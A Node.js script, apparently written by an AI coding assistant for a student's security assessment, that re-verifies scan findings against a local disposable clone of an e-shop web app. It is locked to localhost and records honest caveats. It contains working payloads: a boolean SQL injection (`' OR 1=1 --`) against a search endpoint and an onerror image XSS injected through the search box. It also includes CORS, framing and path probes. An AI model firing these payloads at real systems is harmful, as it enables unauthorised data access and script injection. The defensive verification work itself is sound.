// Bounded, read-only verification on a disposable clone; not a manual Burp session.
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const http = require("node:http");
const net = require("node:net");
const crypto = require("node:crypto");
const { spawn, execFileSync } = require("node:child_process");
const { once } = require("node:events");
const { pathToFileURL } = require("node:url");
const { parseArgs } = require("node:util");

const ROOT = path.resolve(__dirname, "../..");
const API = "http://127.0.0.1:3000";
const WEB = "http://127.0.0.1:5173";
const sha = bytes => crypto.createHash("sha256").update(bytes).digest("hex");
const safeUrl = input => {
  const url = new URL(input);
  for (const key of url.searchParams.keys()) {
    if (/token|password|secret|key/i.test(key)) url.searchParams.set(key, "[REDACTED]");
  }
  return url.toString();
};

async function freePort(port) {
  const probe = net.createServer();
  await new Promise((resolve, reject) => {
    probe.once("error", reject);
    probe.listen(port, "127.0.0.1", resolve);
  });
  await new Promise(resolve => probe.close(resolve));
}

async function get(url, headers = {}) {
  const target = new URL(url);
  assert(target.protocol === "http:" && target.hostname === "127.0.0.1");
  assert(["3000", "5173"].includes(target.port));
  const started = new Date().toISOString();
  const tick = performance.now();
  return new Promise((resolve, reject) => {
    const request = http.get(target, { headers, timeout: 10000 }, response => {
      const chunks = [];
      response.on("data", chunk => chunks.push(chunk));
      response.on("end", () => {
        const bytes = Buffer.concat(chunks);
        const body = bytes.toString("utf8");
        let count = null;
        try { const value = JSON.parse(body); count = Array.isArray(value) ? value.length : null; } catch {}
        resolve({ body, record: {
          request: { method: "GET", url: safeUrl(url), headers }, started_at_utc: started,
          automated_elapsed_ms: performance.now() - tick,
          response: { status: response.statusCode, byte_length: bytes.length, sha256: sha(bytes),
            headers: Object.fromEntries(["content-type", "access-control-allow-origin",
              "access-control-allow-credentials", "x-powered-by", "x-content-type-options",
              "content-security-policy", "x-frame-options"].map(key => [key, response.headers[key] ?? null])),
            json_array_count: count },
        } });
      });
      response.on("error", reject);
    });
    request.on("timeout", () => request.destroy(new Error("Local request timed out")));
    request.on("error", reject);
  });
}

async function main() {
  const { values } = parseArgs({ options: {
    sut: { type: "string" }, "output-dir": { type: "string" },
    "browser-module": { type: "string" }, "reset-lab": { type: "boolean", default: false },
  } });
  assert(values.sut && values["output-dir"] && values["browser-module"] && values["reset-lab"],
    "Require --sut, --output-dir, --browser-module and explicit --reset-lab for a disposable clone.");
  const sut = fs.realpathSync(path.resolve(values.sut));
  const privateRoot = fs.realpathSync(path.join(ROOT, "Nhu/private")) + path.sep;
  assert(sut.toLowerCase().startsWith(privateRoot.toLowerCase()), "Disposable clone must stay in Nhu/private.");
  const output = path.resolve(values["output-dir"]);
  const browserModule = path.resolve(values["browser-module"]);
  assert(!fs.existsSync(output), "Never overwrite recorded evidence.");
  const git = args => execFileSync("git", ["-C", sut, ...args], { encoding: "utf8", windowsHide: true }).trim();
  assert.equal(path.resolve(git(["rev-parse", "--show-toplevel"])).toLowerCase(), sut.toLowerCase());
  const sourceStatus = () => git(["status", "--porcelain", "--untracked-files=no", "--", ".",
    ":(exclude)backend/database.sqlite"]);
  assert.equal(sourceStatus(), "", "Do not alter SUT source to obtain a result.");
  for (const port of [3000, 5173, 5174]) await freePort(port);
  const started = new Date().toISOString();
  const backend = path.join(sut, "backend");
  const frontend = path.join(sut, "frontend-web");
  const originalCwd = process.cwd();
  const server = spawn(process.execPath, ["server.js"], {
    cwd: backend, windowsHide: true, stdio: ["ignore", "pipe", "pipe"],
  });
  let launchError;
  server.on("error", error => { launchError = error; });
  server.stdout.resume();
  server.stderr.resume();
  let vite, browser, harness;
  const records = {};
  const request = async (id, url, headers) => {
    assert(!Object.hasOwn(records, id));
    const response = await get(url, headers);
    records[id] = response.record;
    return response;
  };
  try {
    let ready = false;
    for (let attempt = 0; attempt < 100; attempt++) {
      if (launchError) throw launchError;
      assert.equal(server.exitCode, null, "Lab backend exited");
      try { const response = await get(API + "/api/products");
        if (response.record.response.json_array_count > 0) { ready = true; break; }
      } catch {}
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    assert(ready, "Lab seed is not ready");
    // Tailwind's relative content paths must resolve from the real frontend, as in npm run dev.
    process.chdir(frontend);
    const viteEntry = require.resolve("vite", { paths: [frontend] });
    const { createServer } = await import(pathToFileURL(viteEntry).href);
    vite = await createServer({ root: frontend,
      cacheDir: path.join(frontend, "node_modules/.vite-nhu-review"),
      server: { host: "127.0.0.1", port: 5173, strictPort: true, open: false },
      logLevel: "error" });
    await vite.listen();

    const noMatch = "__NHU_NO_PRODUCT_23120312__";
    const control = await request("sql-control", API + "/api/products?search=" + noMatch);
    const query = condition => API + "/api/products?search=" + encodeURIComponent(noMatch + "' OR " + condition + " -- ");
    const yes = await request("sql-true", query("1=1"));
    const no = await request("sql-false", query("1=2"));
    const quote = await request("sql-quote", API + "/api/products?search=%27");
    assert.equal(control.record.response.json_array_count, 0);
    assert.equal(no.record.response.json_array_count, 0);
    assert(yes.record.response.json_array_count > 0, "SQLi effect not verified");
    const products = await request("api-products", API + "/api/products?search=", { Origin: "http://127.0.0.1:5174" });
    await request("api-detail", API + "/api/products/1");
    const guest = await request("api-private-guest", API + "/api/users/me", { Origin: "http://127.0.0.1:5174" });
    assert.equal(guest.record.response.status, 401);
    assert.equal(products.record.response.headers["access-control-allow-origin"], "*");
    await request("web-root", WEB + "/");
    await request("web-forgot", WEB + "/forgot-password");
    await request("web-css", WEB + "/src/index.css");
    await request("web-env", WEB + "/node_modules/vite/dist/client/env.mjs");
    const oldPath = "/node_modules/.vite/deps/chunk-CYJPkc-J.js";
    await request("path-old-chunk-control", WEB + oldPath);
    await request("path-old-chunk-attack", WEB + oldPath + "?v=%2Fchunk-CYJPkc-J.js");
    const refresh = await request("web-react-refresh", WEB + "/@react-refresh");
    const queryToken = await request("web-synthetic-token", WEB + "/?token=NHU_SYNTHETIC_QUERY_NOT_RESET_TOKEN");

    const reactFile = require.resolve("react-dom/package.json", { paths: [frontend] });
    const reactSource = path.join(path.dirname(reactFile), "cjs/react-dom-client.development.js");
    const reactBytes = fs.readFileSync(reactSource);
    const reactText = reactBytes.toString("utf8");
    const constantAt = reactText.indexOf("2080374784");
    const constantContext = constantAt < 0 ? null : reactText.slice(Math.max(0, constantAt - 100), constantAt + 100);

    harness = http.createServer((req, res) => {
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end('<!doctype html><title>Nhu local frame verification</title><h1>Local frame verification</h1>' +
        '<iframe title="EShop frame" src="' + WEB + '/forgot-password" width="1000" height="700"></iframe>');
    });
    await new Promise(resolve => harness.listen(5174, "127.0.0.1", resolve));
    const playwright = require(browserModule);
    browser = await playwright.chromium.launch({ channel: "msedge", headless: true });
    const context = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
    const blocked = new Set();
    await context.route("**/*", async route => {
      const url = new URL(route.request().url());
      if (["localhost", "127.0.0.1"].includes(url.hostname) && ["3000", "5173", "5174"].includes(url.port)) {
        await route.continue();
      } else { blocked.add(url.origin); await route.abort(); }
    });
    const page = await context.newPage();
    await page.goto("http://127.0.0.1:5174", { waitUntil: "networkidle" });
    const cors = await page.evaluate(async base => {
      const check = async (route, credentials) => {
        try { const response = await fetch(base + route, { credentials });
          const data = await response.json();
          return { status: response.status, readable: true, array_count: Array.isArray(data) ? data.length : null,
            contains_user_profile: data && typeof data === "object" && "email" in data };
        } catch { return { readable: false, blocked_or_network_error: true }; }
      };
      return { public_without_credentials: await check("/api/products", "omit"),
        public_with_credentials: await check("/api/products", "include"),
        private_without_credentials: await check("/api/users/me", "omit") };
    }, API);
    assert(cors.public_without_credentials.readable && cors.public_without_credentials.array_count > 0);
    assert.equal(cors.private_without_credentials.status, 401);
    assert.equal(cors.public_with_credentials.readable, false);
    await page.waitForFunction(() => document.querySelector("iframe")?.contentWindow != null);
    const frame = page.frames().find(frame => frame.url() === WEB + "/forgot-password");
    assert(frame);
    await frame.locator("form").waitFor();
    fs.mkdirSync(output, { recursive: true });
    await page.screenshot({ path: path.join(output, "frame-rendered.png"), fullPage: true });
    const payload = '<img src=data:, onerror="document.documentElement.dataset.nhuProof=\'executed\';this.outerHTML=\'<strong>NHU_XSS_EXECUTED</strong>\'">';
    await page.goto(WEB + "/?search=" + encodeURIComponent(payload), { waitUntil: "networkidle" });
    const urlDeliveryExecuted = await page.evaluate(() => document.documentElement.dataset.nhuProof === "executed");
    assert.equal(urlDeliveryExecuted, false, "URL delivery changed; re-evaluate the demonstrated attack model");
    await page.locator('input[type="text"]').first().fill(payload);
    await page.waitForFunction(() => document.documentElement.dataset.nhuProof === "executed");
    await page.getByText("NHU_XSS_EXECUTED", { exact: true }).waitFor();
    await page.screenshot({ path: path.join(output, "xss-executed.png"), fullPage: true });
    const screenshotHashes = Object.fromEntries(["frame-rendered.png", "xss-executed.png"].map(name =>
      [name, sha(fs.readFileSync(path.join(output, name)))]));
    assert.equal(sourceStatus(), "", "SUT source changed during verification");
    const fileNames = ["backend/server.js", "backend/database.js", "backend/package-lock.json",
      "frontend-web/package-lock.json", "frontend-web/src/pages/Home.jsx", "frontend-web/src/pages/ForgotPassword.jsx"];
    const versions = Object.fromEntries(["express", "sqlite3", "vite", "react-dom"].map(name => {
      const base = ["vite", "react-dom"].includes(name) ? frontend : backend;
      return [name, JSON.parse(fs.readFileSync(require.resolve(name + "/package.json", { paths: [base] }), "utf8")).version];
    }));
    const report = {
      schema_version: "nhu-local-alert-verification-v1", sut_commit: git(["rev-parse", "HEAD"]),
      executed_by: "Codex AI assistant", student_id: "23120312", student_performed: false,
      independent_human_review: false, burp_executed: false, is_ground_truth: false, is_benchmark_result: false,
      started_at_utc: started, finished_at_utc: new Date().toISOString(), node_version: process.version,
      browser_version: browser.version(), dependency_versions: versions,
      runner_sha256: sha(fs.readFileSync(__filename)),
      source_sha256: Object.fromEntries(fileNames.map(name => [name, sha(fs.readFileSync(path.join(sut, name)))])),
      original_scan_commit_known: false, original_url_host: "localhost", replay_host: "127.0.0.1",
      requests: records,
      checkpoints: {
        sql_boolean_effect_verified: true, sql_quote_http_status: quote.record.response.status,
        cors, cross_origin_frame_rendered: true, sensitive_frame_action_attempted: false,
        xss_dom_marker_executed: true, xss_payload: payload,
        xss_delivery_demonstrated: "local_input_only", url_query_delivery_executed: urlDeliveryExecuted,
        victim_delivery_demonstrated: false,
        react_numeric_constant: { found: constantAt >= 0, context: constantContext,
          relative_source: "react-dom/cjs/react-dom-client.development.js", source_sha256: sha(reactBytes) },
        react_refresh_contains_todo: refresh.body.includes("TODO"),
        synthetic_query_changes_html_body: queryToken.record.response.sha256 !== records["web-root"].response.sha256,
      },
      screenshots: screenshotHashes, blocked_external_origins: [...blocked],
      notice: "Read-only HTTP/browser checks on a disposable clone, not a manual Burp run or human timing. " +
        "No users/passwords were dumped. DOM script execution uses locally typed input, not proven victim delivery. " +
        "Old Vite chunk paths may not exist in this rebuild. " +
        "Reproduction on this commit does not prove identical behavior at the unrecorded original scan commit.",
    };
    fs.writeFileSync(path.join(output, "verification.json"), JSON.stringify(report, null, 2) + "\n", { flag: "wx" });
    console.log(JSON.stringify({ sut_commit: report.sut_commit, requests: Object.keys(records).length,
      sql_verified: true, xss_verified: true, frame_rendered: true, independent_human_review: false }));
  } finally {
    process.chdir(originalCwd);
    if (browser) await browser.close();
    if (harness) await new Promise(resolve => harness.close(resolve));
    if (vite) await vite.close();
    if (server.exitCode === null) {
      const stopped = once(server, "close");
      server.kill();
      await stopped;
    }
  }
}

if (require.main === module) main().catch(() => {
  console.error("Local verification failed; no substitute evidence generated. Check lab paths, ports and dependencies.");
  process.exitCode = 1;
});

module.exports = { safeUrl };
